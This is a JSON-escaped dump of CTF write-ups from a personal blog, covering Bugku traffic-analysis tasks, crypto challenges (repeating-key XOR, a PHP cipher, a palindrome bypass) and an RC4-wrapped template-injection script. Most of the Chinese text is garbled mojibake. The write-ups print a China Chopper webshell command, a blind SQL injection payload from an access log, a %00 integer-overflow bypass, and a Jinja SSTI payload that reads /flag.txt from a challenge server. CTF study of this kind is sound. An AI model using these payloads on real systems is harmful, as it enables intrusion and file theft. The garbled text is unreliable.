style=\"color:#960050;background-color:#1e0010\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e$ddctf = new Session();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e$ddctf-\u0026gt;index();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e?\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¾—åˆ°\u003ccode\u003ekey\u003c/code\u003eä¹‹åæ„é€ ddctfid:\u003c/p\u003e","title":"2019 DDCTF web"},{"content":" bugku ä¸­çš„éƒ¨åˆ†miscé¢˜ç›®\nä¸­å›½èœåˆ€ ä¸‹è½½æµé‡åŒ…ä¹‹åè¿½è¸ªtcpæµé‡æˆ–è€…httpæµé‡å¯ä»¥åœ¨ç›®å½•ä¸­çœ‹è§flag.tar.gzå­—æ®µ\næ€è·¯1ï¼šbinwalk\nå…ˆæŠŠæ•°æ®åŒ…æ–‡ä»¶æ‹–è¿›kaliå­ç³»ç»Ÿä¸­\nchmod 777 caidao/ cd caidao/ chmod 777 caidao.pcapng binwalk -e caidao.pcapng cd _caidao.pcapng.extracted/ cat 1E43 æ€è·¯2ï¼šwiresharkæ•°æ®åŒ…è¿½è¸ªï¼ŒæŠŠä¸€ä¸²base64æ‹å‡ºæ¥\n@ini_set(\u0026#34;display_errors\u0026#34;,\u0026#34;0\u0026#34;); @set_time_limit(0); if(PHP_VERSION\u0026lt;\u0026#39;5.3.0\u0026#39;) {@set_magic_quotes_runtime(0);}; echo(\u0026#34;X@Y\u0026#34;); $D=\u0026#39;C:\\\\wwwroot\\\\\u0026#39;; $F=@opendir($D); if($F==NULL){echo(\u0026#34;ERROR:// Path Not Found Or No Permission!\u0026#34;);} else{$M=NULL;$L=NULL; while($N=@readdir($F)){$P=$D.\u0026#39;/\u0026#39;.$N;$T=@date(\u0026#34;Y-m-d H:i:s\u0026#34;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=\u0026#34;\\t\u0026#34;.$T.\u0026#34;\\t\u0026#34;.@filesize($P).\u0026#34;\\t\u0026#34;.$E.\u0026#34;\\n\u0026#34;;if(@is_dir($P))$M.=$N.\u0026#34;/\u0026#34;.$R;else $L.=$N.$R;} echo $M.$L;@closedir($F);};echo(\u0026#34;X@Y\u0026#34;);die(); å½“ç„¶è¿™æ²¡å•¥ç”¨ã€‚ã€‚\næ•°æ®åŒ…çš„æ•°æ®éƒ½æ˜¯åœ¨line-based text dataé‡Œé¢çš„\nç‚¹å‡»line-based text data,å³å‡»ï¼Œç‚¹å‡»æ˜¾ç¤ºshow packet bytes é¢ã€‚ã€‚ã€‚æŠŠåƒ\\301\\213\\341è¿™æ ·çš„ç¼–ç å¤„ç†ä¸€ä¸‹ï¼Œä¹‹æ‰€ä»¥startè®¾ç½®ä¸º3ï¼Œæ˜¯å› ä¸ºå‰é¢çš„å¼€å¤´æ˜¯x@yï¼Œä¸æ˜¯base64çš„ä¸œè¥¿ã€‚ã€‚ã€‚è®¾ç½®ä¸ºå¤„ç†æ¨¡å¼ä¸ºå‹ç¼©\nè¿™ä¹ˆå¤šæ•°æ®åŒ… åˆ†æï¼Œæ®è¯´å¦‚æœæ˜¯æŒ‚æœ¨é©¬çš„è¯tcpæµä¸­ä¼šæœ‰â€œcommandâ€å­—æ®µ,äºæ˜¯è®¾å®šè¿‡æ»¤è§„åˆ™ä¸ºï¼š\ntcp contains \u0026#34;command\u0026#34; æ‰¾å‡ºä¸€äº›tcpåŒ…æ¥ï¼Œç„¶åfollowï¼Œæ³¨æ„å¦‚æœæ˜¯ä¹±ç çš„è¯å¯ä»¥å°è¯•ç‚¹ä¸€ç‚¹streamé•¿åº¦ï¼Œè¯´ä¸å®šå°±å¥½äº† ç„¶åå°±æ‰¾åˆ°äº†flagçš„base64ç \næ‰‹æœºçƒ­ç‚¹ è“ç‰™åè®®çš„åå­—å«åšobexï¼Œæ‰€ä»¥åœ¨wiresharkä¸­æœç´¢ä¸€ä¸‹æŒ‘å‡ºå‡ ä¸ªåŒ…ï¼Œç„¶åæœ‰ä¸€ä¸ªåŒ…å†™ç€â€œsecret.rarâ€ å¯¼å‡ºæ¥ï¼Œè§£å‹å¾—åˆ°flag\næŠ“åˆ°ä¸€åªè‹è‡ httpè¿‡æ»¤ä¸€ä¸‹ï¼Œåœ¨ç¬¬ä¸€ä¸ªæ•°æ®åŒ…ä¸­çš„å†…å®¹å¦‚ä¸‹ï¼š\n{ \u0026#34;path\u0026#34;:\u0026#34;fly.rar\u0026#34;, \u0026#34;appid\u0026#34;:\u0026#34;\u0026#34;, \u0026#34;size\u0026#34;:525701, \u0026#34;md5\u0026#34;:\u0026#34;e023afa4f6579db5becda8fe7861c2d3\u0026#34;, \u0026#34;sha\u0026#34;:\u0026#34;ecccba7aea1d482684374b22e2e7abad2ba86749\u0026#34;, \u0026#34;sha3\u0026#34;:\u0026#34;\u0026#34; } å‘ç°äº†è¦ä¼ è¾“çš„æ–‡ä»¶åå­—ã€æ–‡ä»¶çš„md5ç ã€æ–‡ä»¶å¤§å°ï¼Œ\nhttp \u0026amp;\u0026amp; http.request.method==POST è¿‡æ»¤å‡ºæ¥çš„æ¥ä¸‹æ¥çš„5ä¸ªåˆ†ç‰‡æ•°æ®åŒ… æ€»é•¿åº¦åŠ èµ·æ¥è¶…è¿‡äº†åŸæ–‡ä»¶çš„æ•°æ®åŒ…å¤§å°ï¼ŒåŸå› æ˜¯é™„åŠ çš„æ–‡ä»¶å¤´ã€‚ å°†è¿™äº›æ•°æ®åŒ…ä¸€ä¸ªä¸€ä¸ªå¯¼å‡º ç„¶åä½¿ç”¨å‘½ä»¤ï¼š\ndd if=1 bs=1 skip=364 of=1.1 #ddå‘½ä»¤ç”¨äºè¯»å–ã€è½¬æ¢ã€è¾“å‡ºæ•°æ® cat *.1 \u0026gt; fly.rar #å°†è¿™äº›æ–‡ä»¶ç¢ç‰‡éƒ½æ‹¼æˆåŸå§‹çš„å‹ç¼©æ–‡ä»¶ md5sum fly.rar | grep e023afa4f6579db5becda8fe7861c2d3 #æ£€æŸ¥MD5ç æ˜¯å¦åŒ¹é… ç„¶åç”¨blessæ‰“å¼€raræ–‡ä»¶ï¼Œæ£€æŸ¥åŠ å¯†ä½ï¼Œå‘ç°æ˜¯ä¼ªåŠ å¯†ï¼Œå› ä¸ºç¬¬ä¸€è¡Œçš„73åé¢çš„æ ‡è®°ä½æ˜¯0000ï¼Œå¦‚æœåŠ å¯†å°±æ˜¯8000 raræ–‡ä»¶å¤´æ ¼å¼ä»‹ç»ï¼šhttps://wenku.baidu.com/view/b7889b64783e0912a2162aa4.html\næŠŠç¬¬äºŒè¡Œ74åé¢çš„84æ”¹æˆ80å°±å¯ä»¥äº†ï¼Œå› ä¸ºçœ‹è®ºæ–‡å¯ä»¥çŸ¥é“ï¼Œè¿™ä¸¤ä¸ªå­—èŠ‚çš„å€¼ç±»ä¼¼äºlinuxä¸­chmodçš„1ã€2ã€4ä»£è¡¨ä¸‰ç§æƒé™ï¼Œ æœ€ç»ˆå°†æ‰€éœ€æƒé™çš„å€¼ç›¸åŠ åœ¨ä¸€èµ·å¾—åˆ°æœ€ç»ˆçš„æ ‡å¿—ä½å†…å®¹\næ”¹å®Œä¹‹åï¼Œè§£å‹ï¼Œæ‰“å¼€ï¼Œå‘ç°ä¹±ç ï¼Œæ”¹åç¼€ä¸ºexeï¼Œæ‰§è¡Œï¼Œå‘ç°ä¸€å¤§å †è‹è‡\nbinwalk flag.txt #å‘ç°å¾ˆå¤špngå›¾ç‰‡ï¼Œå°è¯•ä½¿ç”¨foremostå·¥å…·è¿›è¡Œæ–‡ä»¶ä¿®å¤ foremost -v -i flag.txt -o outputfile #-v å°†æ‰€æœ‰ä¿¡æ¯è¾“å‡ºåˆ°å±å¹•ä¸Šï¼Œ-iè¡¨ç¤ºè¾“å…¥æ–‡ä»¶,-oè¡¨ç¤ºè¾“å‡ºç›®æ ‡ æ‰“å¼€åæœ‰äºŒç»´ç ï¼Œé‡Œå¤´æœ‰flag\næ—¥å¿—å®¡è®¡ sqlmapäºŒåˆ†æœç´¢\nè§‚å¯Ÿä¸‹é¢è¿™ä¸ª\n172.17.0.1 - - [03/Nov/2018:02:50:57 +0000] \u0026#34;GET /vulnerabilities/sqli_blind/?id=2\u0026#39; AND ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM dvwa.flag_is_here ORDER BY flag LIMIT 0,1),24,1))\u0026gt;124 AND \u0026#39;RCKM\u0026#39;=\u0026#39;RCKM\u0026amp;Submit=Submit HTTP/1.1\u0026#34; 200 1765 \u0026#34;http://127.0.0.1:8001/vulnerabilities/sqli_blind/?id=1\u0026amp;Submit=Submit\u0026#34; \u0026#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36\u0026#34; ç‰¹å¾æœ‰200å“åº”æˆåŠŸï¼Œè€Œä¸”å¯¹äºæ¯ä¸€ä½æ¥è¯´ï¼Œæœ€åä¸€æ¬¡å¾—åˆ°200å“åº”åŒ¹é…çš„asciiç åŠ ä¸Šä¸€å°±æ˜¯çœŸå®çš„asciiç ï¼Œ\n1 import urllib 2 import re 3 4 ffile=open(\u0026#39;/home/access.log\u0026#39;,\u0026#39;r\u0026#39;) 5 datas=ffile.readlines() 6 avalid=[] 7 for data in datas: 8 tmp=urllib.unquote(data) 9 if \u0026#39;flag\u0026#39; in tmp and \u0026#39;COUNT\u0026#39; not in tmp and \u0026#39;200\u0026#39; in tmp: 10 avalid.append(tmp) 11 12 flag_ascii={} 13 for segment in avalid: 14 checkout=re.search(r\u0026#39;LIMIT 0,1\\),(.*?),1\\)\\)\u0026gt;(.*?) AND\u0026#39;,segment) #è¿™é‡Œ(.*?)åé¢è¦åŠ ANDå¦åˆ™å¤§äºå·ä¹‹åçš„æ‰€æœ‰å†…å®¹éƒ½è¢«åŒ…æ‹¬è¿›(.*?)ä¸­å»äº† 15 if checkout: 16 key=int(checkout.group(1)) 17 print key 18 print checkout.group(2) 19 print int(checkout.group(2)) 20 value=int(checkout.group(2))+1 21 flag_ascii[key]=value #åŒä¸€ä¸ªkeyï¼Œvalueåœ¨å˜åŒ–ç›´åˆ°æœ€åä¸€ä¸ª 23 flag=\u0026#39;\u0026#39; for value in flag_ascii.values(): flag+=chr(value) print flag weblogic è¯´æ˜¯è¦æ‰¾åˆ°è¢«æ”»å‡»ä¸»æœºçš„åå­—ã€‚è¿‡æ»¤æ¡ä»¶\ntcp contains \u0026#34;hostname\u0026#34; ç„¶åæ‰¾ä¸€æ‰¾å°±è¡Œäº†ã€‚ã€‚ã€‚\nä¿¡æ¯æå– è¿™é“é¢˜çœŸçš„å¾ˆæ‡µåœˆã€‚ å°†wiresharkä¸­æ¶‰åŠåˆ°ç›²æ³¨çš„æ•°æ®åŒ…éƒ½å¯¼å‡ºåˆ°txtæ–‡ä»¶ä¸­æ¥ã€‚ ç„¶åpythonè„šæœ¬ï¼š\nimport urllib import re f=open(\u0026#39;/root/kkk.txt\u0026#39;,\u0026#39;r\u0026#39;) lines=f.readlines() datas=[] for line in lines: tmp=urllib.unquote(line) datas.append(tmp) flag_ascii={} for data in datas: checkout=re.search(r\u0026#39;LIMIT 0,1),(.*?),1\\)\\)\u0026gt;(.*?) HTTP\u0026#39;,data) if checkout: key=int(checkout.group(1)) value=int(checkout.group(2)) flag_ascii[key]=value flag=\u0026#39;\u0026#39; for value in flag_ascii.values(): flag+=chr(value) print flag ä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆflagä¸­æœ‰çš„å­—ç¬¦æ˜¯å¯¹çš„æœ‰çš„æ˜¯é”™çš„ã€‚\n","permalink":"https://dragonbox.top/posts/sec-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","summary":"\u003cblockquote\u003e\n\u003cp\u003ebugku ä¸­çš„éƒ¨åˆ†miscé¢˜ç›®\u003c/p\u003e\n\u003c/blockquote\u003e","title":"æµé‡åˆ†æ"},{"content":" è®°å½•å¯†ç å­¦åˆ·è¿‡çš„é¢˜ç›®\nDe1ctf2019 xorzz æºç \nfrom itertools import * # from data import flag,plain plain = \u0026#34;dd\u0026#34; flag = \u0026#34;de1ctf{testflag}\u0026#34; key=flag.strip(\u0026#34;de1ctf{\u0026#34;).strip(\u0026#34;}\u0026#34;) assert(len(key)\u0026lt;38) salt=\u0026#34;WeAreDe1taTeam\u0026#34; ki=cycle(key) si=cycle(salt) cipher = \u0026#39;\u0026#39;.join([hex(ord(p) ^ ord(next(ki)) ^ ord(next(si))) for p in plain]) print cipher # output: # 49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c é¦–å…ˆå°†å¯†æ–‡ä¸­çš„ç›åˆ†å»æ‰ã€‚\nfrom itertools import * from base64 import * output=\u0026#39;49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c\u0026#39; salt=\u0026#34;WeAreDe1taTeam\u0026#34; sa = cycle(salt) out = output.decode(\u0026#39;hex\u0026#39;) res = \u0026#34;\u0026#34; for i in out: res += chr(ord(i) ^ ord(next(sa))) # print b64encode(res.encode(\u0026#39;hex\u0026#39;)) print b64encode(res) å»æ‰ç›åˆ†ä¹‹åï¼Œé—®é¢˜å°±å˜æˆäº†æ±‰æ˜æ–‡å¯†ç ã€‚åŸç†è§åšå®¢https://www.anquanke.com/post/id/161171#h2-0 è¿™é‡Œç›´æ¥ä¸Šè„šæœ¬äº†ã€‚\n# -*- coding: utf-8 -*- import itertools import linecache CHARACTER_FREQ = { \u0026#39;a\u0026#39;: 0.0651738, \u0026#39;b\u0026#39;: 0.0124248, \u0026#39;c\u0026#39;: 0.0217339, \u0026#39;d\u0026#39;: 0.0349835, \u0026#39;e\u0026#39;: 0.1041442, \u0026#39;f\u0026#39;: 0.0197881, \u0026#39;g\u0026#39;: 0.0158610, \u0026#39;h\u0026#39;: 0.0492888, \u0026#39;i\u0026#39;: 0.0558094, \u0026#39;j\u0026#39;: 0.0009033, \u0026#39;k\u0026#39;: 0.0050529, \u0026#39;l\u0026#39;: 0.0331490, \u0026#39;m\u0026#39;: 0.0202124, \u0026#39;n\u0026#39;: 0.0564513, \u0026#39;o\u0026#39;: 0.0596302, \u0026#39;p\u0026#39;: 0.0137645, \u0026#39;q\u0026#39;: 0.0008606, \u0026#39;r\u0026#39;: 0.0497563, \u0026#39;s\u0026#39;: 0.0515760, \u0026#39;t\u0026#39;: 0.0729357, \u0026#39;u\u0026#39;: 0.0225134, \u0026#39;v\u0026#39;: 0.0082903, \u0026#39;w\u0026#39;: 0.0171272, \u0026#39;x\u0026#39;: 0.0013692, \u0026#39;y\u0026#39;: 0.0145984, \u0026#39;z\u0026#39;: 0.0007836, \u0026#39; \u0026#39;: 0.1918182 } def xor_repeat_key(key,string): key_len=len(key) result=\u0026#39;\u0026#39; str_result=\u0026#39;\u0026#39; for index,ch in enumerate(string): n=index%key_len b=chr(ord(key[n])^ord(ch)) str_result+=b return str_result #è·å¾—æ¦‚ç‡åˆ†æ•° def get_score(string): score=0 for char in string: char=char.lower() if char in CHARACTER_FREQ: score+=CHARACTER_FREQ[char] return score #å°†hexçš„æ¯ä¸ªå­—ç¬¦ä¸å¤‡é€‰å¯†é’¥è¿›è¡Œxor def single_xor(candidate_key,hex_string): result=\u0026#34;\u0026#34; for i in hex_string: b=chr(candidate_key^ord(i)) result+=b return result #éå†å¤‡é€‰å¯†é’¥ def Traversal_singlechar(hex_string): candidate=[] for candidate_key in range(256): plaintext=single_xor(candidate_key,hex_string) score=get_score(plaintext) result={ \u0026#39;score\u0026#39;:score, \u0026#39;plaintext\u0026#39;:plaintext, \u0026#39;key\u0026#39;:candidate_key } candidate.append(result) return sorted(candidate,key=lambda c:c[\u0026#39;score\u0026#39;])[-1] def hamming_distance(a_str,b_str): dist=0 for x,y in zip(a_str,b_str): b=bin(ord(x)^ord(y)) #è½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼ˆä»¥å­—ç¬¦ä¸²å½¢å¼è¡¨ç¤ºï¼Œå¦‚â€œ0b100000â€ï¼Œ0bè¡¨ç¤ºäºŒè¿›åˆ¶ï¼‰ dist+=b.count(\u0026#39;1\u0026#39;) return dist def guess_keysize(string): normals=[] for keysize in range(2,40): blocks=[] cnt=0 distance=0 #æ ¹æ®å»ºè®®è·å¾—å››ä¸ªblockï¼Œå°†è¿™å››ä¸ªblockä¸¤ä¸¤å¾—åˆ°hamming_distanceã€‚ for i in range(0,len(string),keysize): cnt+=1 blocks.append(string[i:i+keysize]) if cnt==4: break pairs=itertools.combinations(blocks,2) for (x,y) in pairs: distance+=hamming_distance(x,y) #å¹³å‡ä¸€ä¸‹ distance=distance/(6.0) #Normalize this result by dividing by KEYSIZE. normal_distance=distance/keysize key={ \u0026#39;keysize\u0026#39;:keysize, \u0026#39;distance\u0026#39;:normal_distance } normals.append(key) #print key #é€‰3ä¸ªæœ€å°çš„ä¸ºå¾…é€‰çš„keysize candidate_keysize=sorted(normals,key=lambda c:c[\u0026#39;distance\u0026#39;])[0:3] return candidate_keysize def guess_key(keysize,string): now_str=\u0026#39;\u0026#39; key=\u0026#39;\u0026#39; for i in range(keysize): now_str=\u0026#39;\u0026#39; for index,ch in enumerate(string): if index%keysize==i: now_str+=ch #è·å¾—keyçš„ç¬¬iä½çš„å€¼,è½¬æ¢ä¸ºå­—ç¬¦ #print now_str key+=chr(Traversal_singlechar(now_str)[\u0026#39;key\u0026#39;]) return key def get_plaint(string): keysize_list=guess_keysize(string) candidate_key=[] possible_plaints=[] for keysize in keysize_list: key=guess_key(keysize[\u0026#39;keysize\u0026#39;],string) #print key possible_plaints.append((xor_repeat_key(key,string),key)) \u0026#39;\u0026#39;\u0026#39; for i in possible_plaints: print i[1] print get_score(i[0].decode(\u0026#39;hex\u0026#39;)) print len(i[0]) print i[0].decode(\u0026#39;hex\u0026#39;) \u0026#39;\u0026#39;\u0026#39; return sorted(possible_plaints,key=lambda c:get_score(c[0]))[-1] def main(): assert hamming_distance(\u0026#39;this is a test\u0026#39;, \u0026#39;wokka wokka!!!\u0026#39;) == 37 contents=open(\u0026#39;6.txt\u0026#39;).read() #base64è§£ç  string=str(contents).decode(\u0026#39;base64\u0026#39;) result=get_plaint(string) print result[0] print result[1] if __name__ == \u0026#39;__main__\u0026#39;: main() 6.txtä¸­çš„å†…å®¹æ˜¯å»ç›åˆ†ä¹‹åçš„å¯†æ–‡base64ä¹‹åçš„å†…å®¹ã€‚\nå†é™„ä¸Šhctf2018ä¸­å¤©æ¢çš„è„šæœ¬\nimport string def bxor(a, b): # xor two byte strings of different lengths if len(a) \u0026gt; len(b): return bytes([x ^ y for x, y in zip(a[:len(b)], b)]) else: return bytes([x ^ y for x, y in zip(a, b[:len(a)])]) def hamming_distance(b1, b2): differing_bits = 0 for byte in bxor(b1, b2): differing_bits += bin(byte).count(\u0026#34;1\u0026#34;) return differing_bits def break_single_key_xor(text): key = 0 possible_space=0 max_possible=0 letters = string.ascii_letters.encode(\u0026#39;ascii\u0026#39;) for a in range(0, len(text)): maxpossible = 0 for b in range(0, len(text)): if(a == b): continue c = text[a] ^ text[b] if c not in letters and c != 0: continue maxpossible += 1 if maxpossible\u0026gt;max_possible: max_possible=maxpossible possible_space=a key = text[possible_space]^ 0x20 return chr(key) text = \u0026#39;\u0026#39; with open(\u0026#34;6.txt\u0026#34;,\u0026#34;r\u0026#34;) as f: for line in f: text += line # b = base64.b64decode(text) b = text normalized_distances = [] for KEYSIZE in range(2, 40): b1 = b[: KEYSIZE] b2 = b[KEYSIZE: KEYSIZE * 2] b3 = b[KEYSIZE * 2: KEYSIZE * 3] b4 = b[KEYSIZE * 3: KEYSIZE * 4] b5 = b[KEYSIZE * 4: KEYSIZE * 5] b6 = b[KEYSIZE * 5: KEYSIZE * 6] normalized_distance = float( hamming_distance(b1, b2) + hamming_distance(b2, b3) + hamming_distance(b3, b4) + hamming_distance(b4, b5) + hamming_distance(b5, b6) ) / (KEYSIZE * 5) normalized_distances.append( (KEYSIZE, normalized_distance) ) normalized_distances = sorted(normalized_distances,key=lambda x:x[1]) for KEYSIZE,_ in normalized_distances[:5]: block_bytes = [[] for _ in range(KEYSIZE)] for i, byte in enumerate(b): block_bytes[i % KEYSIZE].append(byte) keys = \u0026#39;\u0026#39; try: for bbytes in block_bytes: keys += break_single_key_xor(bbytes) key = bytearray(keys * len(b), \u0026#34;utf-8\u0026#34;) plaintext = bxor(b, key) print(\u0026#34;keysize:\u0026#34;, KEYSIZE) print(\u0026#34;key is:\u0026#34;, keys, \u0026#34;n\u0026#34;) s = bytes.decode(plaintext) print(s) except Exception: continue MD5 PHP_encrypto_1 source code:::\n\u0026lt;?php function encrypt($data,$key) { $key = md5(\u0026#39;ISCC\u0026#39;); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i \u0026lt; $len; $i++) { if ($x == $klen) { $x = 0; } $char .= $key[$x]; $x+=1; } for ($i=0; $i \u0026lt; $len; $i++) { $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); } return base64_encode($str); } ?\u0026gt;//the result is fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA= solving:\n\u0026lt;?php #\u0026#39;ISCC\u0026#39;md5ä¹‹åçš„ç»“æœ $mkey =\u0026#39;729623334f0aa2784a1599fd374c120d\u0026#39;; $target=\u0026#39;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=\u0026#39;; $target=base64_decode($target); $target_ay=array(); for ($i=0;$i\u0026lt;strlen($target);$i++) { echo ord($target[$i]).\u0026#39; \u0026#39;; array_push($target_ay,ord($target[$i])); } echo \u0026#34;||||||||\u0026#34;; $j=0; $realkey_ay=array(); for ($i=0;$i\u0026lt;strlen($target);$i++){ if ($j==strlen($mkey)){ $j=0; } echo ord($mkey[$j]).\u0026#39; \u0026#39;; array_push($realkey_ay,ord($mkey[$j])); $j++; } $flag1=\u0026#39;\u0026#39;; $flag2=\u0026#39;\u0026#39;; foreach($target_ay as $key=\u0026gt;$value){ $i=$key; $dd=$value; $od=$realkey_ay[$i]; $flag1.=chr($dd+128-$od); $flag2.=chr($dd-$od); } echo $flag1; echo $flag2; ?\u0026gt; other shiyanbar do you really know php?(plalindrome) \u0026lt;?php $info = \u0026#34;\u0026#34;; $req = []; $flag=\u0026#34;xxxxxxxxxx\u0026#34;; ini_set(\u0026#34;display_error\u0026#34;, false); error_reporting(0); if(!isset($_POST[\u0026#39;number\u0026#39;])){ header(\u0026#34;hint:6c525af4059b4fe7d8c33a.txt\u0026#34;); die(\u0026#34;have a fun!!\u0026#34;); } foreach([$_POST] as $global_var) { foreach($global_var as $key =\u0026gt; $value) { $value = trim($value); is_string($value) \u0026amp;\u0026amp; $req[$key] = addslashes($value); } } function is_palindrome_number($number) { $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i \u0026lt; $j) { if($number[$i] !== $number[$j]) { return false; } $i++; $j--; } return true; } //can not input number if(is_numeric($_REQUEST[\u0026#39;number\u0026#39;])){ $info=\u0026#34;sorry, you cann\u0026#39;t input a number!\u0026#34;; //the number must be int-type }elseif($req[\u0026#39;number\u0026#39;]!=strval(intval($req[\u0026#39;number\u0026#39;]))){ $info = \u0026#34;number must be equal to it\u0026#39;s integer!! \u0026#34;; }else{ $value1 = intval($req[\u0026#34;number\u0026#34;]); $value2 = intval(strrev($req[\u0026#34;number\u0026#34;])); //the number should be plalindrome if($value1!=$value2){ $info=\u0026#34;no, this is not a palindrome number!\u0026#34;; }else{ //the number should not be plalindrome if(is_palindrome_number($req[\u0026#34;number\u0026#34;])){ $info = \u0026#34;nice! {$value1} is a palindrome number!\u0026#34;; }else{ $info=$flag; } } } echo $info; ?\u0026gt; payload :2147483647%00\nfirst: as there is %00, is_numeric() will not recognize it as number\nsecond: both strval and intval will ignore %00 and %20\nthird: after strrev() 2147483647 will turn to 7463847412 , however, intval() can hanle max num of 2147483647, so intval(7463847412)=2147483647\nforth: the number is not plalindrome,so get the flag\nRC4 rc4: åŠ å¯†å’Œè§£å¯†éƒ½æ˜¯åŒä¸€ä¸ªæµç¨‹\nimport urllib import requests url = \u0026#34;http://43141291-ab15-4d3a-a236-3c2c0fd69898.node3.buuoj.cn/secret?secret=\u0026#34; class RC4: def __init__(self, key): self.key = key self.key_length = len(key) self._init_S_box() def _init_S_box(self): self.Box = [i for i in range(256)] k = [self.key[i % self.key_length] for i in range(256)] j = 0 for i in range(256): j = (j + self.Box[i] + ord(k[i])) % 256 self.Box[i], self.Box[j] = self.Box[j], self.Box[i] def crypt(self, plaintext): i = 0 j = 0 result = \u0026#39;\u0026#39; for ch in plaintext: i = (i + 1) % 256 j = (j + self.Box[i]) % 256 self.Box[i], self.Box[j] = self.Box[j], self.Box[i] t = (self.Box[i] + self.Box[j]) % 256 result += chr(self.Box[t] ^ ord(ch)) return result a = RC4(\u0026#39;HereIsTreasure\u0026#39;) cmd = \u0026#34;{{ [].__class__.__base__.__subclasses__()[40](\u0026#39;/flag.txt\u0026#39;).read() }}\u0026#34; payload = urllib.parse.quote(a.crypt(cmd)) res = requests.get(url + payload) print(res.text) ","permalink":"https://dragonbox.top/posts/ctf-crypto/","summary":"\u003cblockquote\u003e\n\u003cp\u003eè®°å½•å¯†ç å­¦åˆ·è¿‡çš„é¢˜ç›®\u003c/p\u003e\n\u003c/blockquote\u003e","title":"å¯†ç å­¦é¢˜ç›®"},{"content":" çºªå¿µé‚£æ®µå²æœˆ\nweb3 ç½‘ç«™é‡Œé¢å¾ªç¯å¼¹å‡ºæç¤ºæ¡†ï¼Œç”¨chromeçš„å¼€å‘è€…å·¥å…·æ‰“å¼€ä¸€ç‰‡ç©ºç™½ï¼Œ ç”¨ctrl+uæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°ä¸€ä¸²\n\u0026lt;!--\u0026amp;#75;\u0026amp;#69;\u0026amp;#89;\u0026amp;#123;\u0026amp;#74;\u0026amp;#50;\u0026amp;#115; \u0026amp;#97;\u0026amp;#52;\u0026amp;#50;\u0026amp;#97;\u0026amp;#104;\u0026amp;#74;\u0026amp;#75;\u0026amp;#45; \u0026amp;#72;\u0026amp;#83;\u0026amp;#49;\u0026amp;#49;\u0026amp;#73;\u0026amp;#73;\u0026amp;#73;\u0026amp;#125;--\u0026gt; è¿™æ˜¯unicodeï¼Œè½¬ç å³å¯\nä½ å¿…é¡»è®©ä»–åœä¸‹æ¥ï¼ 